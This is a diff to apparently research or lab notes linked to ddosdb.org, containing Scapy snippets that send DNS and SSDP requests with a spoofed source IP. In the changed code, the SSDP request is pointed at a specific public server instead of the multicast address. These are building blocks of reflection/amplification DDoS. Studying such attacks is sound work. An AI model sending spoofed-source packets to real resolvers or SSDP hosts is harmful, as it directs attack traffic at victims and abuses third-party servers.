@@ -13,7 +13,7 @@ sudo python
 ```python
 from scapy.all import *
 dnsQuery="ddosdb.org"
-spoofedIPsrc="130.89.14.206"
+spoofedIPsrc="130.89.14.205"
 dnsResolver1="8.8.8.8"
 dnsResolver2="130.89.0.128"
 
@@ -26,15 +26,16 @@ sr1(spoofedDNSRequest)
 
 ```python
 from scapy.all import *
-spoofedIPsrc="130.89.14.206"
+spoofedIPsrc="130.89.14.205"
+SSDPserver="84.129.203.235"
 
-payload = "M-SEARCH * HTTP/1.1\r\n" \ #It is a HTTP over UDP or HTTPU
-"HOST:239.255.255.250:1900\r\n" \     #It is always the multicast IP address 239.255.255.250
-"ST:upnp:rootdevice\r\n" \            #Search Target
-"MAN: \"ssdp:discover\"\r\n" \      
-"MX:4\r\n\r\n"                        #Maximum waiting time (should be in the interval [1,5[)
+payload = "M-SEARCH * HTTP/1.1\r\n" \
+"HOST:"+SSDPserver+":1900\r\n" \
+"ST:upnp:rootdevice\r\n" \
+"MAN: \"ssdp:discover\"\r\n" \
+"MX:2\r\n\r\n"
 
-ssdpRequest = IP(src=spoofedIPsrc,dst="239.255.255.250") / UDP(sport=1900, dport= 1900) / payload
+ssdpRequest = IP(src=spoofedIPsrc,dst=SSDPserver) / UDP(sport=1900, dport= 1900) / payload
 sr1(ssdpRequest)
 ```
 
